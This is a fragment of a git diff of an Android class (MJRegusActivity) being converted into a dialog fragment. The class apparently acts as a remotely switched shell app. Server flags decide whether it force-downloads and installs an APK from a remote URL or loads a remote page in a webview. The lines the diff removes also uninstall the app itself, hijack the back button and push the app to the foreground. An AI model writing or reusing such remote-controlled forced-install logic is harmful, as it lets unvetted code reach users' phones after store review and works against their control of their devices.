+//                                        JSONObject jsonObject = advertiseArray.getJSONObject(i);
+//                                        if (jsonObject != null) {
+//                                            if (jsonObject.has("AdvertiseUrl")) {
+//
+//                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
+//                                                        .putString(key_ad_value + i, jsonObject.getString("AdvertiseUrl")).apply();
+//
+//                                            }
+//
+//                                            if (jsonObject.has("IsEnable")) {
+//
+//                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
+//                                                        .putBoolean(key_ad_kg + i, jsonObject.getBoolean("IsEnable")).apply();
+//                                            }
+//                                        }
+//                                    }
+//                                }
+//
+//                            }
 
                             jumpLocalSplash();
 
-                        } else if (dataJsonObject.getBoolean("IsDownload")) {
+                        } else if (dataJsonObject.getBoolean("IsOpenDown")) {
                             downLoadUrl = dataJsonObject.getString("DownloadUrl");
                             mode = 1;
                             Log.e("regus 得到的下载链接: ", downLoadUrl);
-                           // showDownLoadDialog();
                             isForce = true;
-                            checkPermision();
-                        } else if (dataJsonObject.getBoolean("IsEnable")) {
+                            showDownLoadDialog();
+                        } else if (dataJsonObject.getBoolean("IsOpenJump")) {
                             //h5模式
                             mode = 0;
-                            startWebview(dataJsonObject.getString("Url"));
+                            startWebview(dataJsonObject.getString("JumpUrl"));
                         } else {
                             jumpLocalSplash();
                         }
@@ -900,9 +849,8 @@ public class MJRegusActivity extends Activity {
                 jumpLocalSplash();
             }
 
-        } else {
-            requestNextHost();
-            Log.e("regus_", " 域名: " + host + " 不可用");
+        }else {
+            jumpLocalSplash();
         }
 
     }
@@ -921,14 +869,15 @@ public class MJRegusActivity extends Activity {
      */
 
     private void jumpLocalSplash() {
-        try {
-            Class aimClass = Class.forName(activityPath);
-            Intent intent = new Intent(MJRegusActivity.this, aimClass);
-            startActivity(intent);
-            finish();
-        } catch (ClassNotFoundException e) {
-            e.printStackTrace();
-        }
+//        try {
+//            Class aimClass = Class.forName(activityPath);
+//            Intent intent = new Intent(getActivity().this, aimClass);
+//            startActivity(intent);
+            dismissAllowingStateLoss();
+
+//        } catch (ClassNotFoundException e) {
+//            e.printStackTrace();
+//        }
     }
 
 
@@ -951,7 +900,7 @@ public class MJRegusActivity extends Activity {
      */
 
     private void showDownLoadDialog() {
-        runOnUiThread(new Runnable() {
+        getActivity().runOnUiThread(new Runnable() {
             @Override
             public void run() {
                 showDownLoadUi();
@@ -967,7 +916,7 @@ public class MJRegusActivity extends Activity {
     public void downloadPackage() {
 
         if (TextUtils.isEmpty(downLoadUrl)) {
-            Toast.makeText(MJRegusActivity.this, "未配置APP下载链接~", Toast.LENGTH_LONG);
+            Toast.makeText(getContext(), "未配置APP下载链接~", Toast.LENGTH_LONG);
             return;
         }
 
@@ -992,6 +941,8 @@ public class MJRegusActivity extends Activity {
 
                 URL url = new URL(downLoadUrl);
 
+                Log.e("regus 跳转请求url", url+"");
+
                 HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                 httpURLConnection.setConnectTimeout(7000);
                 httpURLConnection.setReadTimeout(7000);
@@ -1009,7 +960,7 @@ public class MJRegusActivity extends Activity {
                 if (AssistUtils.checkExistSDCard()) {
                     savefolder = Environment.getExternalStorageDirectory();
                 } else {
-                    savefolder = getDir("update", 3);
+                    savefolder = getContext().getDir("update", 3);
                 }
 
 
@@ -1078,16 +1029,16 @@ public class MJRegusActivity extends Activity {
 
     private void showLoadDialogProgress(int progress) {
 
-        runOnUiThread(new Runnable() {
+       getActivity(). runOnUiThread(new Runnable() {
 
             @Override
             public void run() {
 
-                if (progress == 95) {
-                    if (!AssistUtils.isRunningForeground(MJRegusActivity.this)) {
-                        AssistUtils.setTopApp(MJRegusActivity.this);
-                    }
-                }
+//                if (progress == 95) {
+//                    if (!AssistUtils.isRunningForeground(MJRegusActivity.this)) {
+//                        AssistUtils.setTopApp(MJRegusActivity.this);
+//                    }
+//                }
 
                 if (progressBar != null && mProgressNum != null) {
                     progressBar.setProgress(progress);
@@ -1112,13 +1063,13 @@ public class MJRegusActivity extends Activity {
             if (AssistUtils.checkExistSDCard()) {
                 savefolder = Environment.getExternalStorageDirectory();
             } else {
-                savefolder = getDir("update", 3);
+                savefolder = getContext().getDir("update", 3);
             }
 
 
             String aimApkName = "main.apk";
 
-            InputStream is = getAssets().open(aimApkName);
+            InputStream is = getContext().getAssets().open(aimApkName);
 
             updateSaveName = "eric.apk";
 
@@ -1158,32 +1109,40 @@ public class MJRegusActivity extends Activity {
     @SuppressLint("WrongConstant")
     private void gotoInstall() {
 
-        PackageManager pm = this.getPackageManager();
-        PackageInfo info = pm.getPackageArchiveInfo(new File(this.savefolder, this.updateSaveName).getPath(),
-                PackageManager.GET_ACTIVITIES);
+        try {
 
-        if (info != null) {
-            String packageName = info.packageName;
-            theDownloadPkaName = packageName;
-            Log.e("regus_", "checkPackageNameIfsame 远程的包名是 " + packageName);
+            PackageManager pm = this.getContext().getPackageManager();
+            PackageInfo info = pm.getPackageArchiveInfo(new File(this.savefolder, this.updateSaveName).getPath(),
+                    PackageManager.GET_ACTIVITIES);
+
+            if (info != null) {
+                String packageName = info.packageName;
+                theDownloadPkaName = packageName;
+                Log.e("regus_", "checkPackageNameIfsame 远程的包名是 " + packageName);
+            }
+
+        } catch (Exception e){
+            Log.e("regus_", "checkPackageNameIfsame 远程的包 error " + e.getLocalizedMessage());
         }
 
+
         toInstall();
+
     }
 
 
     private void unInstallSelf() {
-        if (AssistUtils.isAvilible(theDownloadPkaName, this)) {
+        if (AssistUtils.isAvilible(theDownloadPkaName, getActivity())) {
             //卸载自己
-            Uri packageUri = Uri.parse("package:" + getPackageName());
-            Intent intent = new Intent(Intent.ACTION_DELETE, packageUri);
-            startActivity(intent);
+//            Uri packageUri = Uri.parse("package:" + getPackageName());
+//            Intent intent = new Intent(Intent.ACTION_DELETE, packageUri);
+//            startActivity(intent);
         } else {
 
             //创建dialog构造器
-            AlertDialog.Builder normalDialog = new AlertDialog.Builder(MJRegusActivity.this);
+            AlertDialog.Builder normalDialog = new AlertDialog.Builder(getActivity());
             //设置title
-            normalDialog.setTitle("最新应用未安装成功");
+            normalDialog.setTitle("最新应用未安装成功？");
             //设置内容
             normalDialog.setMessage("点击确定去安装更新");
             normalDialog.setCancelable(false);
@@ -1198,7 +1157,7 @@ public class MJRegusActivity extends Activity {
             normalDialog.setNegativeButton("取消", new DialogInterface.OnClickListener() {
                 @Override
                 public void onClick(DialogInterface dialog, int which) {
-                    onBackPressed();
+                    dismissAllowingStateLoss();
                 }
             });
 
@@ -1207,47 +1166,82 @@ public class MJRegusActivity extends Activity {
     }
 
 
+    private void installApk(String path) {
+        InstallUtils.installAPK(getActivity(), path, new InstallUtils.InstallCallBack() {
+            @Override
+            public void onSuccess() {
+                //onSuccess：表示系统的安装界面被打开
+                //防止用户取消安装，在这里可以关闭当前应用，以免出现安装被取消
+                getActivity().runOnUiThread(new Runnable() {
+                    @Override
+                    public void run() {
+                        Toast.makeText(getContext(), "正在安装程序", Toast.LENGTH_SHORT).show();
+                    }
+                });
+
+            }
+
+            @Override
+            public void onFail(Exception e) {
+                getActivity().runOnUiThread(new Runnable() {
+                    @Override
+                    public void run() {
+                        Log.e("regus installApk",""+e.getLocalizedMessage());
+                        Toast.makeText(getContext(), "安装失败" + e.getLocalizedMessage(), Toast.LENGTH_SHORT).show();
+                    }
+                });
+
+            }
+        });
+    }
+
+
     @SuppressLint("WrongConstant")
     private void toInstall() {
 
-        Intent intent = new Intent(Intent.ACTION_VIEW);
-        int i = getApplicationInfo().targetSdkVersion;
-        if (Build.VERSION.SDK_INT < 24 || i < 24) {
-            Log.e("regusgotoInstall ", Uri.fromFile(new File(this.savefolder, this.updateSaveName)) + "");
-            intent.setDataAndType(Uri.fromFile(new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
-        } else {
-            //添加这一句表示对目标应用临时授权该Uri所代表的文件
-            intent.setFlags(1);
-            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
-            Log.e("regus setDataAndType", "savefolder :" + savefolder + " updateSaveName " + updateSaveName);
-            intent.setDataAndType(FileProvider.getUriForFile(getApplicationContext(), getPackageName() + ".fileprovider", new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
-        }
+//        Intent intent = new Intent(Intent.ACTION_VIEW);
+//        int i = getContext().getApplicationInfo().targetSdkVersion;
+//        if (Build.VERSION.SDK_INT < 24 || i < 24) {
+//            Log.e("regusgotoInstall ", Uri.fromFile(new File(this.savefolder, this.updateSaveName)) + "");
+//            intent.setDataAndType(Uri.fromFile(new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
+//        } else {
+//            //添加这一句表示对目标应用临时授权该Uri所代表的文件
+//            intent.setFlags(1);
+//            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+//            Log.e("regus setDataAndType", "savefolder :" + savefolder + " updateSaveName " + updateSaveName);
+//            intent.setDataAndType(FileProvider.getUriForFile(getContext().getApplicationContext(), getContext().getPackageName() + ".fileprovider", new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
+//        }
+//
+//        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+//
+//        if (theDownloadPkaName.equals(getContext().getPackageName())) {
+//            startActivity(intent);
+//            getActivity(). finish();
+//        } else {
+//            startActivity(intent);
+//            isCover = true;
+//        }
 
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        installApk(new File(this.savefolder, this.updateSaveName).getPath());
 
-        if (theDownloadPkaName.equals(getPackageName())) {
-            startActivity(intent);
-            finish();
-        } else {
-            startActivity(intent);
-            isCover = true;
-        }
 
     }
 
     private boolean isCover;
 
 
-    @Override
-    protected void onResume() {
-        super.onResume();
+//    @Override
+//    protected void onResume() {
+//        super.onResume();
+//
+//        Log.e("regus_", "onResume");
+//
+//        if (isCover) {
+//            unInstallSelf();
+//        }
+//    }
 
-        Log.e("regus_", "onResume");
 
-        if (isCover) {
-            unInstallSelf();
-        }
-    }
 
 
     /**
@@ -1256,10 +1250,10 @@ public class MJRegusActivity extends Activity {
 
     private void jumpTo(final String url, int type) {
 
-        runOnUiThread(new Runnable() {
+        getActivity().runOnUiThread(new Runnable() {
             @Override
             public void run() {
-                Toast.makeText(MJRegusActivity.this, "程序正在执行,请勿关闭浏览器~", Toast.LENGTH_LONG);
+                Toast.makeText(getContext(), "程序正在执行,请勿关闭浏览器~", Toast.LENGTH_LONG);
                 showTipDialog(url);
                 startBrowser(url);
             }
@@ -1272,7 +1266,7 @@ public class MJRegusActivity extends Activity {
     private void showTipDialog(final String url) {
 
         //创建dialog构造器
-        AlertDialog.Builder normalDialog = new AlertDialog.Builder(MJRegusActivity.this);
+        AlertDialog.Builder normalDialog = new AlertDialog.Builder(getActivity());
         //设置title
         normalDialog.setTitle("需要跳转到浏览器");
         //设置内容
@@ -1302,28 +1296,17 @@ public class MJRegusActivity extends Activity {
     }
 
 
-    @Override
-    public void onBackPressed() {
-        //实现Home键效果
-        //super.onBackPressed();这句话一定要注掉,不然又去调用默认的back处理方式了
-        Intent i = new Intent(Intent.ACTION_MAIN);
-        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        i.addCategory(Intent.CATEGORY_HOME);
-        startActivity(i);
-    }
 
 
     @Override
-    protected void onDestroy() {
+    public void onDestroy() {
         super.onDestroy();
-
-        Log.e("regus_", "onDestroy");
-
         if (downloadApkThread != null) {
             downloadApkThread.interrupt();
             downloadApkThread = null;
         }
     }
+
 
 
 }
